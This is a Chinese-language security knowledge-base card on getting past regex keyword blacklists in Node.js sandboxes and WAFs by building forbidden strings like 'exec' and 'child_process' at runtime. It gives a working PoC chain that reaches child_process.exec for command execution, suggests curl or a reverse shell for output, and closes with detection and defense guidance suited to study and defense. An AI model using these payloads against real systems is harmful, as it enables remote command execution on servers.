---
id: web-nodejs-js-keyword-regex-string-construction-bypass
title: JS 正则关键字黑名单绕过：拼接/模板字符串/十六进制/Unicode/base64/fromCharCode 运行时构造被禁字符串
type: scenario
domain: web
path: web/nodejs
technique: js-keyword-regex-string-construction-bypass
tags:
- javascript
- nodejs
- waf-bypass
- blacklist
- string-construction
- encoding
- template-string
- base64
- child-process
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V401
  verified_at: '2026-11-09T12:58:42+08:00'
  notes: '已对照原文核对：拼接/concat/嵌套模板/十六进制/Unicode/base64 各种构造与原文图片 06-12 的 REPL 结果（[Function: exec]/[Function: execSync]）一致；String.fromCharCode 全链构造数字对应 ASCII 正确（process/child_process/exec）。dedup 核对：per-card 报告 top 候选为本卡自身（建卡后重跑所致，duplicate 自匹配为假象），非自身最近候选 vm-waf-reflect-ownkeys-bypass/expression-blacklist-string-concat-process-env/child-process-exec-keyword-waf-spawn-bypass 均 cosine≈0.89-0.90、verdict=related，分别绑定具体题目/产品/换 API，与本卡通用字符串构造手法不同链，按 related 新建成立。路径 web/nodejs 合法；frontmatter 无 sources/source/source_url/文章 ID；原文未给版本信息，affected_versions 已 --clear。小瑕疵：原理节『\x65\x78\x65\x63 在词法分析阶段就被还原为 exec，exec 同理』第二个 exec 应为 \u 转义，属笔误不影响手法正确性。未验证点：未在本机复跑 PoC。dup-scan.json（2026-11-08）早于本卡建卡，且无涉及本卡的 pair。'
url: /docs/web/nodejs/web-nodejs-js-keyword-regex-string-construction-bypass/
draft: false
kb_aliases:
- 关键字过滤绕过
- 字符串拼接绕过 WAF
- 模板字符串绕过
- 十六进制转义绕过
- Unicode 转义绕过
- base64 关键字绕过
- String.fromCharCode 绕过
- 方括号访问绕过点号过滤
- 大小写绕过 JS 黑名单
---

## 一句话结论

当 WAF/沙箱外层用正则匹配连续字面量来封禁 `process`、`exec`、`child_process`、`Function` 等关键字（或封禁 `.`、`+`、`concat`、反斜杠等字符）时，JavaScript 允许在运行时构造字符串——`"ex"+"ec"`、`"ex".concat("ec")`、嵌套模板字符串、`\x` 十六进制、`\u` Unicode 转义、`Buffer.from(base64).toString()`、`String.fromCharCode(...)`——源码中不出现被禁字面量或字符，运行时仍得到同一属性/API 引用，从而继续执行命令。

## 原理

- 正则黑名单只检查源码文本，不执行、不化简表达式；而 JS 引擎在运行期对字符串表达式求值：`"ex" + "ec"`、`` `${...}` ``、`String.prototype.concat` 的返回值都是 `"exec"`，属性访问 `obj["exec"]` 与 `obj.exec` 等价。
- 字符串字面量里的 `\x65\x78\x65\x63` 在词法分析阶段就被还原为 `exec`，`exec` 同理；对 WAF 而言请求里出现的是反斜杠加字母数字，不是被禁关键字。`Buffer.from("ZXhlYw==", "base64").toString()` 与 `String.fromCharCode(101,120,101,99)` 则在运行时生成任意字符串，源码完全不出现目标字符。
- 大小写：JS 标识符大小写敏感，若正则没有 `/i`，`Process`、`PROCESS` 不会命中 `process`；但对象上的属性名本身仍是小写，所以通常配合 `'Process'.toLowerCase()`、`String.fromCharCode` 等在运行时还原正确大小写后再取属性。
- 点号被禁时，`obj["exec"]`/`obj[key]` 的方括号属性访问与 `obj.exec` 完全等价；若方括号也一并被禁，可改用 `Reflect.get(obj, key)` 等反射调用（见关联卡）。
- 根因是“用字符串黑名单当安全边界”：JS 有拼接、模板、转义、编码、反射等多种等价写法，正则无法枚举；只有 AST 白名单/隔离运行时才能约束表达能力。

## 触发条件

- 存在执行用户可控 JavaScript 的入口（vm/vm2 沙箱、`eval`/`new Function`、表达式引擎、低代码脚本），外层用正则/`includes` 做关键字黑名单。
- 黑名单匹配的是连续字面量或特定字符（`.`, `+`, `\`, `concat`, `Buffer` 等），未做解码/规范化，也未做 AST 检查。
- 被禁关键字仍需作为属性名/模块名/函数名使用（如 `process`、`exec`、`child_process`）。
- 攻击者可反复提交并观察拦截差异，用于确认哪些构造方式未命中规则。

## 利用步骤

1. 用 `1+1` 之类无害输入确认执行入口；提交含 `process`/`exec` 的代码确认黑名单命中特征。
2. 按被禁对象选择构造方式：关键字用拼接/模板/编码；`.` 用方括号；`+` 与 `concat` 也被禁时改用模板字符串或 `String.fromCharCode`；反斜杠被禁时避免 `\x`/`\u`。
3. 先构造 `child_process` 模块名与 `exec` 方法名，确认能拿到函数引用（返回值回显 `[Function: exec]` 或执行结果）。
4. 拼接完整逃逸链：取 `process` → `mainModule.require(child_process)` → 调用 `exec`/`execSync`。
5. 无回显时用 `curl`/反弹 Shell 外带。

## PoC

同一属性名的多种等价构造（Node.js REPL 实测均返回 `[Function: exec]`）：

```javascript
require('child_process')["ex" + "ec"]                                  // + 拼接
require('child_process')["ex".concat("ec")]                            // concat
require('child_process')[`${`${`exe`}c`}`]                             // 嵌套模板字符串
require('child_process')["\x65\x78\x65\x63"]                           // 十六进制转义
require('child_process')["\u0065\u0078\u0065\u0063"]             // Unicode 转义
require('child_process')[Buffer.from("ZXhlYw==", "base64").toString()] // base64
require('child_process')[String.fromCharCode(101, 120, 101, 99)]       // ASCII 码
```

假设黑名单禁止 `process`、`child_process`、`exec` 字面量，用 `String.fromCharCode` 拼出整条链：

```javascript
const p = this.constructor.constructor('return ' + String.fromCharCode(112,114,111,99,101,115,115))();
const cp = p.mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));
cp[String.fromCharCode(101,120,101,99)]('whoami');
```

点号被禁时改用方括号：`globalThis["process"]["mainModule"]`；大小写正则未加 `/i` 时可用 `'Process'.toLowerCase()` 还原关键字。

## 变体与关联

- 变体（构造方式）：`atob()`/`Buffer.from(..., 'hex')`、`decodeURIComponent('%65%78%65%63')`、`String.raw`、多行注释/换行插在关键字中间（仅绕过行式匹配）等；本质都是“源码文本 ≠ 运行时字符串”。
- 变体（组合绕过）：当 `+`、`concat`、`Buffer`、`\`、`[` `]` 都被同一条正则封禁时，用嵌套模板字符串 + `String.fromCharCode` + `Reflect.get`/`Reflect.ownKeys` 组合避开全部字面量，见 NKCTF 实例卡。
- 边界：若 WAF 先对输入解码/常量折叠再匹配，或改用 AST 白名单（禁止字符串拼接、动态属性、反射），本手法失效；`String.fromCharCode` 需已知目标字符串的 ASCII 序列。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass]]（同一套构造手法在 vm 沙箱 + 方括号封禁场景下的完整逃逸链）、[[web-nodejs-expression-blacklist-string-concat-process-env]]（Bun 表达式 `includes` 黑名单下的拼接绕过）、[[web-nodejs-child-process-exec-keyword-waf-spawn-bypass]]（换 API 而非换字符串的另一种绕过思路）。
- 关联：[[web-python-waf-bypass-dynamic-attribute-keyword-split]]（Python 中字符串拼接/`getattr`/`chr` 的同类运行时构造思路）。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]、[[binary-pwn-sandbox-escape-nodejs-vm-object-create-null-callee-caller]]（本卡常作为这两条逃逸链的 WAF 外层绕过）。

## 检测与防御

- 检测：用户代码中出现 `String.fromCharCode`、`\x`/`\u` 转义串、`Buffer.from(..., 'base64')`、`atob`、`decodeURIComponent`、模板字符串嵌套、`'Xxx'.toLowerCase()` 等构造特征；同类请求多次变更编码方式提交。
- 防御：不要用正则/关键字黑名单做安全边界；对用户代码做 AST 白名单（只允许白名单语法/函数），或在隔离进程/`isolated-vm` 中执行并默认无 `require`/`process` 能力。
- 若必须过滤，先对输入做解码与常量折叠后再匹配，并对拼接、模板、动态属性、反射统一限制；但应视为纵深防御而非保证。
- 监控：Node 进程异常加载 `child_process`、派生子进程、沙箱接口返回命令输出等行为特征。
